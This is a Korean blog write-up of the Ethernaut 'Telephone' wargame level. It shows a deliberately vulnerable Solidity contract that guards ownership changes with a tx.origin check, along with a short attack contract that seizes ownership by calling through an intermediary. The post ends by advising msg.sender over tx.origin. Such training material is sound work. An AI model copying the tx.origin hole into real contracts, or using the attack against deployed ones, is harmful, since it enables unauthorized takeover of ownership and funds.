---
emoji: 🧢
title: (Ethernaut 취약점 4) Telephone  
date: '2022-01-07 20:26:00'
author: 한성원
tags: ethernaut Telephone vulnerability
categories: 취약점분석
---


# 👋 1. Telephone
__Difficulty 1/10__

- 승리 조건
- 코드 분석
- 풀이
순서로 진행 될 것이다.

- - -

## 승리 조건
- Ownership 뺐어오기

- - -

## 코드 분석
분석은 주석에!

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

    //owner의 주소
    address public owner;

    //constructor
    constructor() public {
        //setting owner as deployer
        owner = msg.sender;
    }

    //owner를 바꿀 수 있는 function
    function changeOwner(address _owner) public {
        // 만약 tx.origin과 msg.sender이 다르면 owner를 parameter의 주소로 바꿀 수 있다.
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```
- - -

### 풀이를 위한 Setup
[RemixIDE](https://remix.ethereum.org)를 사용한다. 
remix 사용법은 YouTube와 google에 많이 나와있으니 최신것으로 찾아보자!
그리고 docs를 읽어본다면 사용법을 쉽게 익힐 수 있을 것이다.

한 가지 주의할 점은 CoinFlip은 remix에서 바로 deploy하는 것이 아니라 ethernauts에서 만든 instance의 주소를 가지고 addressAt을 누르면 된다.
또한 우리는 Rinkeby Network를 사용하고 있으니 ENVIRONMENT를 "Injected Web3"를 선택해주어야 한다.


## 풀이
이 문제에서 우리는 ownership을 뺐어와야 한다.

그리고 우리는 코드분석에서 봤듯이 ownership을 가져올 수 있는 방법은 changeOwner()를 call하여 조건을 만족시키면 된다.

여기서 우리가 이해 해야할 점은 tx.origin과 msg.sender의 차이다.

tx.origin과 msg.sender의 차이는 __[이 글](https://holyhansss.github.io/vulnerability/tx.origin/tx_origin/)__ 에서 찾아볼수 있다.

만약 그래도 이해가 안된다면 서칭 고고!!

이해가 되었다면 이제 어떻게 풀지 감이 올 것이라고 생각한다.

__바로 Telephone.changeOwner()를 call하는 contract를 하나 더 만들어서 실행시키면 된다!__


주석을 통해 TelephoneAttack contract를 같이 분석 해보자!
최대한 간단하게 만들어보았다.
```solidity
contract TelephoneAttack {
    //Telephone contract의 address가 들어갈 곳
    address telephone;

    //constructor: TelephoneAttack의 주소를 parameter로 사용한다.
    constructor(address _telephone) public {
        telephone  = _telephone;
    }
    
    //Telephone contract를 공격하는 function
    //실제 공격해서 돈을 빼온다고 생각해 payable을 넣었다!
    function attack() public payable{
        //Telephone contract의 changeOwner를 parameter(msg.sender)와 함께 call한다.
        Telephone(telephone).changeOwner(msg.sender);
    }
}
```

Remix에서 Injected Web3 선택해 위 contract를 deploy하고 attack()을 누르면 ownership을 가져올 수 있다. 

완료 후 ethernaut으로 돌아와 Submit instance를 누르고 조금 기다리면 block이 mine되고, 아래와 같이 뜨며 마무리된다.
```
٩(- ̮̮̃-̃)۶ Well done, You have completed this level!!!
```
- - -
## 마무리
tx.origin은 Ethereum official Docs에서도 사용하지 않을 것을 권장하고 있다. 또한 tx.origin 대신 msg.sender를 사용하기를 권장한다. tx.origin의 기능을 대부분 msg.sender가 대신 처리할 수 있기 때문이다. 정말정말정말정말 tx.origin을 사용해야하는 경우가 아니라면 그냥 안전하게 msg.sender를 사용하자!

그냥 나의 느낌인데 취약점을 공부하고 풀어보니 어떻게 풀지 감이 잡힌다. ethernaut이후에 직접 test과 다른 contract의 취약점을 직접 찾아보고 싶다. ~~찾아서 알려주면 내 경력+1 ㅋㅋㅋ~~
- - -
## 기타 정보
- rinkeyb network ether faucet: https://faucets.chain.link/rinkeby
- ethernaut: https://ethernaut.openzeppelin.com/
- remix IDE: https://remix.ethereum.org
- tx.origin 취약점: https://holyhansss.github.io/vulnerability/tx.origin/tx_origin/

```toc

```